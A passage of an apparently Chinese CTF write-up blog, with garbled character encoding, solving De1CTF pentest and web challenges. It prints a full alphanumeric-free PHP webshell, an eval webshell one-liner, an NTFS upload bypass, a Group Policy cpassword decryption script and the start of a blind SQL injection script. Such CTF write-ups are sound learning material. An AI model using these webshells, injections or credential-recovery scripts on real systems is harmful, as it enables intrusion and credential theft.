class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å®¡è®¡ä¸€ä¸‹å‘ç°æ–‡ä»¶åå¤„æœ‰è¿‡æ»¤ï¼Œå¹¶ä¸”ä¸Šä¼ çš„æ–‡ä»¶ä¸­ä¸èƒ½åŒ…å«<code>æ•°å­—</code>ã€<code>å°å†™å­—æ¯</code>ã€<code>;</code>ã€<code>~</code>ã€<code>^</code>ã€<code>&amp;</code>ã€<code>|</code>ã€<code>åå¼•å·</code>ç­‰ï¼Œæ ¹æ®è¿™ä¸ªè§„åˆ™ï¼Œè‚¯å®šéœ€è¦æ„é€ æ— æ•°å­—å­—æ¯çš„shelläº†ï¼Œä¹‹å‰çœ‹è¿‡<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4">pç¥çš„ä¸€ç¯‡æ–‡ç« </a>è®²è¿‡ï¼Œä¸è¿‡è¿™é‡Œç”±äº<code>ï¼›</code>ä¹Ÿè¢«è¿‡æ»¤ï¼Œéœ€è¦ç”¨<code>çŸ­æ ‡ç­¾</code>æ¥ç»•è¿‡ã€‚</p><p>BPæŠ“åŒ…å‘ç°æœåŠ¡å™¨æ˜¯<code>Windows server</code>ï¼Œè¿™ç§æƒ…å†µä¸‹çš„æ–‡ä»¶ä¸Šä¼ å¯ä»¥åˆ©ç”¨<code>NTFS</code>çš„<code>DATA</code>ç‰¹æ€§è¿›è¡Œç»•è¿‡ï¼Œå‚è€ƒ<a href="http://www.mottoin.com/detail/1939.html">è¿™é‡Œ</a>ç”¨NTFSç‰¹æ€§å’Œæ— æ•°å­—å­—æ¯shellç»•è¿‡é™åˆ¶ä¸Šä¼ ï¼Œç»„ç­–ç•¥æ³„éœ²å¯†ç ã€‚</p><p>æˆåŠŸæ‹¿åˆ°shellä¹‹åï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰¾åˆ°äº†flagçš„å‹ç¼©åŒ…ï¼Œè§£å‹éœ€è¦å¯†ç ï¼Œè¿™é‡Œè€ƒäº†ä¸€ç§åŸŸæ¸—é€ï¼Œåˆ©ç”¨SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç ï¼Œå‚è€ƒ<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">è¿™ç¯‡æ–‡ç« </a>ã€‚</p><p>è§£é¢˜æ€è·¯å¾ˆæ˜ç¡®äº†ï¼šåˆ©ç”¨NTFSç‰¹æ€§å’Œæ— æ•°å­—å­—æ¯shellç»•è¿‡é™åˆ¶ä¸Šä¼ ï¼Œç»„ç­–ç•¥æ³„éœ²å¯†ç ã€‚</p><h4 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p>ç»“åˆpç¥é‚£ç¯‡æ–‡ç« é‡Œç»™å‡ºçš„shellæ„é€ æ–¹æ³•ï¼Œå¯¹å…¶è¿›è¡ŒçŸ­æ ‡ç­¾æ‹¼æ¥ä¹‹åï¼Œshellè„šæœ¬å¦‚ä¸‹ï¼ˆç”±hpdogerå¸ˆå‚…æä¾›ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[]<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$_=@<span class="string">"$_"</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$_=$_[<span class="string">'!'</span>==<span class="string">'@'</span>]<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$____=<span class="string">'_'</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span>  <span class="comment">//S</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$___=$__<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span> <span class="comment">//SY</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span> <span class="comment">//SYS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span> <span class="comment">//SYST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span> <span class="comment">//SYSTE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$___.=$__<span class="meta">?&gt;</span> <span class="comment">//SYSTEM</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span> <span class="comment">//_P</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span> <span class="comment">//_PO</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span> <span class="comment">//_POS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$__=$_<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=$__++<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>=$____.=$__<span class="meta">?&gt;</span> <span class="comment">//_POST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$_=$$____<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span>=$___($_[_])<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//system($_POST[_]) </span></span><br><span class="line"><span class="comment">//ç”¨çš„æ—¶å€™æ³¨é‡Šè¦å»æ‰</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼š<code>assert</code>å’Œ<code>eval</code>åœ¨php7.2ä¸å±äºå‡½æ•°ï¼Œå› æ­¤æ„é€ <code>system</code>ã€‚</p><p>åˆ©ç”¨NTFSçš„<code>DATA</code>ç‰¹æ€§ç»•è¿‡è¿‡æ»¤ä¸Šä¼ å°é©¬ï¼ŒæˆåŠŸæ‹¿åˆ°shellï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf16.png" alt=""></p><p>åˆ©ç”¨è¿™ä¸ªshellï¼Œå†ä¼ ä¸€ä¸ªæ™®é€šshellä¸Šå»ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_=<span class="keyword">echo</span> ^<span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[a]); &gt; ma.php</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦æˆåŠŸå†™å…¥ï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf17.png" alt=""></p><p>æˆåŠŸå†™å…¥æ™®é€šshellï¼Œèšå‰‘è¿æ¥å³å¯ï¼Œåœ¨<code>Hint</code>ç›®å½•ä¸‹å‘ç°ç–‘ä¼¼flagçš„å‹ç¼©åŒ…ï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf14.png" alt=""></p><p>å‹ç¼©åŒ…ä¸‹è½½å‡ºæ¥ä¹‹åéœ€è¦å¯†ç ï¼Œç»ˆç«¯<code>net user /domain</code>çœ‹åˆ°å­˜åœ¨<code>HintZip_Pass</code>ç”¨æˆ·ï¼Œæ˜¾ç„¶ï¼Œè¿™ä¸ªç”¨æˆ·å¯†ç åº”è¯¥å°±æ˜¯å‹ç¼©åŒ…çš„å¯†ç äº†ï¼Œä¸‹é¢å°±éœ€è¦è¿›è¡ŒåŸŸæ¸—é€äº†ã€‚</p><p>ç»ˆç«¯<code>net use</code>è·å–åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf20.png" alt=""></p><p>çœ‹åˆ°<code>SYSVOL</code>ç»„ç­–ç•¥çš„å­˜åœ¨ï¼Œè¯»å–å…¶<code>Groups.xml</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="http://ggb0n.cool/images/de1ctf19.png" alt=""></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Groups</span> <span class="attr">clsid</span>=<span class="string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">User</span> <span class="attr">clsid</span>=<span class="string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> <span class="attr">name</span>=<span class="string">"HintZip_Pass"</span> <span class="attr">image</span>=<span class="string">"2"</span> <span class="attr">changed</span>=<span class="string">"2020-04-15 14:43:23"</span> <span class="attr">uid</span>=<span class="string">"&#123;D33537C1-0BDB-44B7-8628-A6030A298430&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">Properties</span> <span class="attr">action</span>=<span class="string">"U"</span> <span class="attr">newName</span>=<span class="string">""</span> <span class="attr">fullName</span>=<span class="string">""</span> <span class="attr">description</span>=<span class="string">""</span> <span class="attr">cpassword</span>=<span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span> <span class="attr">changeLogon</span>=<span class="string">"1"</span> <span class="attr">noChange</span>=<span class="string">"0"</span> <span class="attr">neverExpires</span>=<span class="string">"0"</span> <span class="attr">acctDisabled</span>=<span class="string">"0"</span> <span class="attr">userName</span>=<span class="string">"HintZip_Pass"</span>/&gt;</span><span class="tag">&lt;/<span class="name">User</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Groups</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„<code>cpassword=&quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;</code>å°±æ˜¯è¯¥ç”¨æˆ·çš„å¯†ç ï¼Œä¸è¿‡æ˜¯ç»è¿‡AESåŠ å¯†çš„ï¼Œå‚è€ƒåŸŸæ¸—é€é‚£ç¯‡æ–‡ç« é‡Œçš„è§£å¯†<code>ps</code>è„šæœ¬ï¼š</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-DecryptedCpassword</span></span> &#123;</span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">        [<span class="built_in">string</span>] <span class="variable">$Cpassword</span> </span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">#Append appropriate padding based on string length  </span></span><br><span class="line">        <span class="variable">$Mod</span> = (<span class="variable">$Cpassword</span>.length % <span class="number">4</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$Mod</span>) &#123;</span><br><span class="line">        <span class="string">'1'</span> &#123;<span class="variable">$Cpassword</span> = <span class="variable">$Cpassword</span>.Substring(<span class="number">0</span>,<span class="variable">$Cpassword</span>.Length <span class="literal">-1</span>)&#125;</span><br><span class="line">        <span class="string">'2'</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">'='</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">        <span class="string">'3'</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">'='</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$Base64Decoded</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$Cpassword</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#Create a new AES .NET Crypto Object</span></span><br><span class="line">        <span class="variable">$AesObject</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.AesCryptoServiceProvider</span><br><span class="line">        [<span class="built_in">Byte</span>[]] <span class="variable">$AesKey</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x4e,<span class="number">0</span>x99,<span class="number">0</span>x06,<span class="number">0</span>xe8,<span class="number">0</span>xfc,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>xc9,<span class="number">0</span>xfa,<span class="number">0</span>xf4,<span class="number">0</span>x93,<span class="number">0</span>x10,<span class="number">0</span>x62,<span class="number">0</span>x0f,<span class="number">0</span>xfe,<span class="number">0</span>xe8,</span><br><span class="line">                             <span class="number">0</span>xf4,<span class="number">0</span>x96,<span class="number">0</span>xe8,<span class="number">0</span>x06,<span class="number">0</span>xcc,<span class="number">0</span>x05,<span class="number">0</span>x79,<span class="number">0</span>x90,<span class="number">0</span>x20,<span class="number">0</span>x9b,<span class="number">0</span>x09,<span class="number">0</span>xa4,<span class="number">0</span>x33,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>x1b)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#Set IV to all nulls to prevent dynamic generation of IV value</span></span><br><span class="line">        <span class="variable">$AesIV</span> = <span class="built_in">New-Object</span> Byte[](<span class="variable">$AesObject</span>.IV.Length) </span><br><span class="line">        <span class="variable">$AesObject</span>.IV = <span class="variable">$AesIV</span></span><br><span class="line">        <span class="variable">$AesObject</span>.Key = <span class="variable">$AesKey</span></span><br><span class="line">        <span class="variable">$DecryptorObject</span> = <span class="variable">$AesObject</span>.CreateDecryptor() </span><br><span class="line">        [<span class="built_in">Byte</span>[]] <span class="variable">$OutBlock</span> = <span class="variable">$DecryptorObject</span>.TransformFinalBlock(<span class="variable">$Base64Decoded</span>, <span class="number">0</span>, <span class="variable">$Base64Decoded</span>.length)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> [<span class="type">System.Text.UnicodeEncoding</span>]::Unicode.GetString(<span class="variable">$OutBlock</span>)</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="built_in">Get-DecryptedCpassword</span> <span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…åˆ°<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">è¿™é‡Œ</a>ä¸‹è½½å¼€æºçš„è§£å¯†è„šæœ¬</p><p>ç”¨å‘½ä»¤è·‘è§£å¯†è„šæœ¬<code>powershell.exe -executionpolicy bypass -file get-DecryptedCpassword.ps1</code></p><p><img src="http://ggb0n.cool/images/de1ctf15.png" alt=""></p><p>æˆåŠŸæ‹¿åˆ°å¯†ç ï¼Œè§£å¯†å³å¯æ‹¿åˆ°flagä»¥åŠä¸‹ä¸€é¢˜çš„æç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag1: De1CTF&#123;GpP_11Is_SoOOO_Ea3333y&#125;</span><br><span class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user&#39;s password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å­¦ä¼šäº†ä¸å°‘ï¼ŒWindows Serverä¸‹çš„NTFSæ–‡ä»¶ä¸Šä¼ ç»•è¿‡ã€åŸŸæ¸—é€ï¼Œåœ¨ä¹‹å‰åšè¿‡çš„é¢˜é‡Œå¾ˆå°‘è§ã€‚</p><h3 id="Hard-Pentest-2"><a href="#Hard-Pentest-2" class="headerlink" title="Hard_Pentest_2"></a>Hard_Pentest_2</h3><p>åŸŸæ¸—é€-åˆ©ç”¨èµ„æºçº¦æŸå§”æ´¾è¿›è¡Œææƒ</p><h3 id="Mixture"><a href="#Mixture" class="headerlink" title="Mixture"></a>Mixture</h3><p>ä¸€é“web+pwné¢˜ï¼Œè¿™é¢˜æ˜¯é˜Ÿé‡Œçš„å¤§å¸ˆå‚…ä»¬åšçš„ï¼Œæˆ‘å°±æ‘¸é±¼å·å­¦ç‚¹çŸ¥è¯†ã€‚</p><h4 id="è§£é¢˜-2"><a href="#è§£é¢˜-2" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p>é¦–å…ˆåˆ©ç”¨<code>benchmark</code>æ³¨å‡ºadminçš„å¯†ç ï¼Œä»å¸ˆå‚…é‚£é‡Œæ¼‚åˆ°è„šæœ¬å­¦ä¹ äº†ä¸€ç•ªï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span></span><br><span class="line"><span class="comment">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'test'</span></span><br><span class="line"><span class="comment">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'</span></span><br><span class="line">string = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">headers= &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=g6u5esdng9h7a2ei3m93srf0mp"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"> <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">  <span class="comment"># print(j)</span></span><br><span class="line">  url = <span class="string">"http://134.175.185.244/member.php?orderby=,ISNULL(CASE WHEN (ascii(substr((select password from member where id=1),&#123;0&#125;,1))=&#123;1&#125;) THEN BENCHMARK(2000000,SHA1(123)) ELSE 2 